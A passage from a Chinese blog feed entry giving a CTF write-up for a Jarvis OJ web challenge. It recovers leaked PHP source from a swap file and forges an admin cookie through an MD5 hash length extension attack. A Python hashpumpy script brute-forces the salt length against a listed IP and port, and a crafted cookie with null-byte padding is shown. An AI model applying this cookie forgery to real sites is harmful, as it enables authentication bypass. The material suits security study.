alt=""><br>第一行是得到的hash值,即hash(secret+’adminadmin’)<br>第二行是已知数据,即’adminadmin’<br>第三行是总长度<br>第四行是要添加的数据(这个随意)</p></li><li><p>将得到的第一行设置到cookie的getmein中，第二行为username+password的值<img src="https://i.imgur.com/aMNrhqG.png" alt=""></p></li></ul><h1 id="未知salt长度"><a href="#未知salt长度" class="headerlink" title="未知salt长度"></a>未知salt长度</h1><p>题目链接:<a href="web.jarvisoj.com:32778/index.php" target="_blank" rel="external">web.jarvisoj.com:32778/index.php</a><br>web题第一操作,先扫一波目录,最近换了个新工具<a href="https://github.com/ring04h/weakfilescan" target="_blank" rel="external">https://github.com/ring04h/weakfilescan</a><img src="https://i.imgur.com/aidEFvL.png" alt=""><br>看到有源码泄露,访问index.php~下载下来源码,因为下载下来的是一串乱七八糟的,需要去恢复一下。</p><p>在linux下用<code>file</code>看一下文件类型<img src="https://i.imgur.com/fbUhj2n.png" alt="">,发现是swap文件的话加上后缀什么的，然后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim -r index.php.swp</div></pre></td></tr></table></figure></p><p>恢复一下就好了。源码如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;title&gt;Web 350&lt;/title&gt;</div><div class="line">&lt;style type=&quot;text/css&quot;&gt;</div><div class="line">body &#123;</div><div class="line">background:gray;</div><div class="line">text-align:center;</div><div class="line">&#125;</div><div class="line">&lt;/style&gt;</div><div class="line">&lt;/head&gt;</div><div class="line"></div><div class="line">&lt;body&gt;</div><div class="line">&lt;?php </div><div class="line">$auth = false;</div><div class="line">$role = &quot;guest&quot;;</div><div class="line">$salt = </div><div class="line">if (isset($_COOKIE[&quot;role&quot;])) &#123;</div><div class="line">$role = unserialize($_COOKIE[&quot;role&quot;]);</div><div class="line">$hsh = $_COOKIE[&quot;hsh&quot;];</div><div class="line">if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123;</div><div class="line">$auth = true;</div><div class="line">&#125; else &#123;</div><div class="line">$auth = false;</div><div class="line">&#125;</div><div class="line">&#125; else &#123;</div><div class="line">$s = serialize($role);</div><div class="line">setcookie(&apos;role&apos;,$s);</div><div class="line">$hsh = md5($salt.strrev($s));</div><div class="line">setcookie(&apos;hsh&apos;,$hsh);</div><div class="line">&#125;</div><div class="line">if ($auth) &#123;</div><div class="line">echo &quot;&lt;h3&gt;Welcome Admin. Your flag is </div><div class="line">&#125; else &#123;</div><div class="line">echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;</div><div class="line">&#125;</div><div class="line">?&gt;</div><div class="line"></div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p><p>发现是hash长度扩展攻击，唯一不同的是不知道secret的长度</p><p>首先观察服务器端给了什么信息,发现服务器端返回了<code>$role=&#39;s:5:&quot;guest&quot;;&#39;</code>以及<code>$hsh=md5(salt+strrev($role))</code><br>然后需要我们求的是<code>md5(salt+strrev(admin))</code></p><p>先看代码吧<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">import hashpumpy</div><div class="line">import urllib</div><div class="line">import requests</div><div class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,30):</div><div class="line">m=hashpumpy.hashpump(<span class="string">'3a4727d57463f122833d9e732f94e4e0'</span>,<span class="string">';\"tseug\":5:s'</span>,<span class="string">';\"nimda\":5:s'</span>,i)</div><div class="line"><span class="built_in">print</span> i</div><div class="line">url=<span class="string">'http://120.26.131.152:32778/'</span></div><div class="line">digest=m[0]</div><div class="line"></div><div class="line">message=urllib.quote(urllib.unquote(m[1])[::-1])</div><div class="line">cookie=<span class="string">'role='</span>+message+<span class="string">'; hsh='</span>+digest</div><div class="line"><span class="comment">#print cookie</span></div><div class="line">headers=&#123;</div><div class="line"><span class="string">'cookie'</span>: cookie,</div><div class="line"><span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0'</span>,</div><div class="line"><span class="string">'Accept'</span>: <span class="string">'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'</span>,</div><div class="line"><span class="string">'Accept-Language'</span>: <span class="string">':zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3'</span>,</div><div class="line"><span class="string">'Accept-Encoding'</span>: <span class="string">'gzip, deflate'</span></div><div class="line">&#125;</div><div class="line"><span class="built_in">print</span> headers</div><div class="line">re=requests.get(url=url,headers=headers)</div><div class="line"><span class="built_in">print</span> re.text</div><div class="line"><span class="keyword">if</span> <span class="string">"Welcome"</span> <span class="keyword">in</span> re.text:</div><div class="line"><span class="built_in">print</span> re;</div><div class="line"><span class="built_in">break</span></div></pre></td></tr></table></figure></p><p>代码是在linux下运行的，因为使用了<code>hashpumpy</code>库，这个库我在win下安装不成功..使用说明如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; import hashpumpy</div><div class="line">&gt;&gt;&gt; help(hashpumpy.hashpump)</div><div class="line">Help on built-in function hashpump in module hashpumpy:</div><div class="line"></div><div class="line">hashpump(...)</div><div class="line">    hashpump(hexdigest, original_data, data_to_add, key_length) -&gt; (digest, message)</div><div class="line"></div><div class="line">    Arguments:</div><div class="line">        hexdigest(str):      Hex-encoded result of hashing key + original_data.</div><div class="line">        original_data(str):  Known data used to get the hash result hexdigest.</div><div class="line">        data_to_add(str):    Data to append</div><div class="line">        key_length(int):     Length of unknown data prepended to the hash</div><div class="line"></div><div class="line">    Returns:</div><div class="line">        A tuple containing the new hex digest and the new message.</div><div class="line">&gt;&gt;&gt; hashpumpy.hashpump(&apos;ffffffff&apos;, &apos;original_data&apos;, &apos;data_to_add&apos;, len(&apos;KEYKEYKEY&apos;))</div><div class="line">(&apos;e3c4a05f&apos;, &apos;original_datadata_to_add&apos;)</div></pre></td></tr></table></figure></p><p>所以代码中,$hsh的值中已知的部分为<code>strrev(serialize(&#39;guest&#39;))</code>,即<code>&#39;;\&quot;tseug\&quot;:5:s&#39;,&#39;</code>,而需要填充的部分为<code>&#39;;\&quot;nimda\&quot;:5:s&#39;</code>,长度则用爆破。</p><p>此时构造出来的cookie为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">role=s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3B; hsh=fcdc3840332555511c4e4323f6decb07</div></pre></td></tr></table></figure></p><p>这样的cookie传到服务端,首先根据源码,会将<code>role</code>反序列化之后比较是否等于<code>admin</code>,这时候会发现php反序列化也存在%00截断<img src="https://i.imgur.com/r1pkG1f.png" alt="">,所以第一个判断过了</p><p>接下来会判断<code>$hsh</code>是否等于<code>md5($salt+strrev($role))</code>,而<code>md5($salt+strrev($role))</code><br>等于<code>md5($salt+strrev(s:5:&quot;admin&quot;;%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s:5:&quot;guest&quot;;))</code><br>等于<code>md5($salt+(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00;\&quot;nimda\&quot;:5:s))</code><br>,而其中<code>md5($salt+(;\&quot;tseug\&quot;:5:s%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00)</code>等于已知的<code>3a4727d57463f122833d9e732f94e4e0</code>,而这个值也将作为下一个分组的输入,这个和hashpump的运算结果是一样的,所以运行一下代码:<img src="https://i.imgur.com/lEoM2Ek.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;感觉挺有用就加了进来&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
